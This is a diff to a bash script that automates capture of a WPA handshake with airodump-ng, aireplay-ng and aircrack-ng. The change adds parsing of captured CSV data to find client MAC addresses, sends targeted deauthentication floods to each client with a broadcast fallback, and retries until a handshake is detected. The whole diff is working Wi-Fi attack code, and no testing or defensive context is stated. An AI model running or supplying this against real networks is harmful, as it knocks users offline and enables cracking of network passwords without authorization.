@@ -110,14 +110,33 @@ read -rp "Enter its channel (CH): " CH
 info "Listening for handshake on $BSSID (channel $CH)..."
 airodump-ng -c "$CH" --bssid "$BSSID" -w cap "$MON" >/dev/null 2>&1 &
 DUMP=$!
-sleep 3
+sleep 5
 
 GOT=0
-# Up to 6 rounds: deauth clients, then check if a handshake was captured.
-for round in 1 2 3 4 5 6; do
-  info "Round $round/6: sending deauth to force clients to reconnect..."
-  aireplay-ng --deauth 8 -a "$BSSID" "$MON" >/dev/null 2>&1 || true
-  sleep 12
+# Up to 8 rounds: find connected clients, deauth them TARGETED, then check.
+for round in 1 2 3 4 5 6 7 8; do
+  CSVCAP="$(ls -t cap-*.csv 2>/dev/null | head -1)"
+  CLIENTS=""
+  if [[ -n "$CSVCAP" ]]; then
+    # station section: columns are  StationMAC,...,...,...,packets,BSSID,...
+    CLIENTS="$(awk -F',' -v B="$BSSID" '
+      /Station MAC/{s=1; next}
+      s && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
+        gsub(/[[:space:]]/,"",$1); gsub(/[[:space:]]/,"",$6);
+        if (toupper($6)==toupper(B)) print $1 }' "$CSVCAP")"
+  fi
+
+  if [[ -n "$CLIENTS" ]]; then
+    info "Round $round/8: found connected client(s), sending TARGETED deauth..."
+    while read -r STA; do
+      [[ -n "$STA" ]] && aireplay-ng --deauth 10 -a "$BSSID" -c "$STA" "$MON" >/dev/null 2>&1 || true
+    done <<< "$CLIENTS"
+  else
+    info "Round $round/8: no client seen yet, broadcast deauth..."
+    aireplay-ng --deauth 10 -a "$BSSID" "$MON" >/dev/null 2>&1 || true
+  fi
+
+  sleep 10
   CAP="$(ls -t cap-*.cap 2>/dev/null | head -1)"
   if [[ -n "$CAP" ]] && aircrack-ng "$CAP" 2>/dev/null | grep -q "1 handshake"; then
     GOT=1; break
